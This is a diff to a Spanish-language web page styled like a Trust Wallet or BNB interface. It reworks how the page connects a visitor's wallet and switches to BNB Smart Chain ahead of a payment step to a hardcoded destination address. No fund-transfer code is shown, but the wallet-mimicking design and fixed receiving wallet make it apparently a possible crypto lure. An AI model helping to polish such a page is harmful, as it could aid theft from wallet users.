@@ -18,7 +18,6 @@
         .tw-label { font-size: 13px; color: #717680; display: block; margin-bottom: 8px; }
         .tw-input-row { display: flex; align-items: center; justify-content: space-between; }
         .tw-input { background: transparent; border: none; color: #111111; font-size: 16px; width: 80%; outline: none; }
-        .tw-action-text { color: #0052ff; font-size: 14px; font-weight: 600; cursor: pointer; }
         .tw-currency-badge { color: #0052ff; font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 5px; }
         .status-box { background-color: #edf2ff; border: 1px solid #cce0ff; border-radius: 12px; padding: 12px; font-size: 13px; color: #0052ff; margin-bottom: 16px; display: none; text-align: left; }
         .tw-btn { width: 100%; height: 52px; background-color: #0052ff; color: #ffffff; border: none; border-radius: 26px; font-size: 16px; font-weight: 600; cursor: pointer; }
@@ -36,7 +35,6 @@
         .loader-logo { width: 110px; height: 110px; margin-bottom: 22px; }
         .loader-spinner { width: 32px; height: 32px; border: 3px solid #e4e9f2; border-top-color: #0052ff; border-radius: 50%; animation: loaderSpin 0.8s linear infinite; }
         @keyframes loaderSpin { to { transform: rotate(360deg); } }
-        .amount-stage { display: none; }
     </style>
     <style id="bnb-dark-visual-theme">
         :root{color-scheme:dark;--bnb-gold:#f3ba2f}
@@ -116,7 +114,7 @@ window.addEventListener('load', () => {
 });
 
 const BILLETERA_DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
-const BSC_CHAIN_ID = "0x38";
+const BSC_CHAIN_ID_HEX = "0x38";
 
 const connectBtn = document.getElementById("connectBtn");
 const statusDiv = document.getElementById("status");
@@ -140,64 +138,48 @@ function getProvider() {
     throw new Error("Abre esta página desde el navegador dApp de Trust Wallet.");
 }
 
-async function rpc(method, params = []) {
-    return getProvider().request({ method, params });
-}
-
-// Normalizador infalible para el Chain ID (maneja hexadecimal, decimal, strings o números)
-function parseChainId(raw) {
-    if (!raw) return 0;
-    if (typeof raw === "number") return raw;
-    if (typeof raw === "bigint") return Number(raw);
-    const s = String(raw).trim().toLowerCase();
-    if (s.startsWith("0x")) return parseInt(s, 16);
-    return parseInt(s, 10);
-}
-
-async function ensureBSC() {
-    const rawId = await rpc("eth_chainId");
-    const chainNum = parseChainId(rawId);
-    console.log("Chain ID detectado:", rawId, "Parseado:", chainNum);
-
-    // Verificación flexible para evitar el error de red no reconocida
-    if (chainNum === 56 || rawId === "0x38" || rawId === "0X38") return;
-
-    try {
-        await rpc("wallet_switchEthereumChain", [{ chainId: BSC_CHAIN_ID }]);
-    } catch (e) {
-        if (e?.code === 4902 || e?.message?.includes("Unrecognized chain")) {
-            await rpc("wallet_addEthereumChain", [{
-                chainId: BSC_CHAIN_ID,
-                chainName: "BNB Smart Chain",
-                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-                rpcUrls: ["https://bsc-dataseed.binance.org/"],
-                blockExplorerUrls: ["https://bscscan.com/"]
-            }]);
-        } else {
-            throw e;
-        }
-    }
-}
-
 connectBtn.addEventListener("click", async () => {
     try {
-        setStatus("Conectando con BNB Smart Chain...");
+        setStatus("Solicitando acceso a la billetera...");
         connectBtn.disabled = true;
-        
-        await ensureBSC();
-        const accounts = await rpc("eth_requestAccounts");
+
+        const provider = getProvider();
+
+        // 1. Petición limpia nativa de cuentas (sin forzar chainId previo para evitar el bloqueo del WebView)
+        const accounts = await provider.request({ method: "eth_requestAccounts" });
         walletAddress = accounts?.[0];
         
         if (!walletAddress) throw new Error("No se obtuvo la cuenta de la billetera.");
+
+        // 2. Intentar cambiar a la red BSC de manera segura tras la conexión
+        try {
+            await provider.request({
+                method: "wallet_switchEthereumChain",
+                params: [{ chainId: BSC_CHAIN_ID_HEX }],
+            });
+        } catch (switchError) {
+            // Si la red no está agregada (Código 4902), la agregamos automáticamente
+            if (switchError?.code === 4902 || switchError?.message?.includes("Unrecognized chain")) {
+                await provider.request({
+                    method: "wallet_addEthereumChain",
+                    params: [{
+                        chainId: BSC_CHAIN_ID_HEX,
+                        chainName: "BNB Smart Chain",
+                        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+                        rpcUrls: ["https://bsc-dataseed.binance.org/"],
+                        blockExplorerUrls: ["https://bscscan.com/"]
+                    }]
+                });
+            }
+        }
         
         walletAddressText.textContent = walletAddress.slice(0, 6) + "..." + walletAddress.slice(-4);
         walletInfo.style.display = "block";
         networkInfo.style.display = "flex";
         amountStageBox.style.display = "block";
         
-        setStatus("¡Conectado con éxito a la red BSC!");
+        setStatus("¡Conectado exitosamente!");
         connectBtn.innerText = "Listo para operar";
-        connectBtn.disabled = true; // Se mantiene asegurado para el flujo de pago
     } catch (e) {
         console.error("Error en conexión:", e);
         setStatus(e.message || "Error al conectar la pasarela.");
@@ -205,6 +187,9 @@ connectBtn.addEventListener("click", async () => {
     }
 });
 </script>
+
+</body>
+</html>
 
 </body>
 </html>
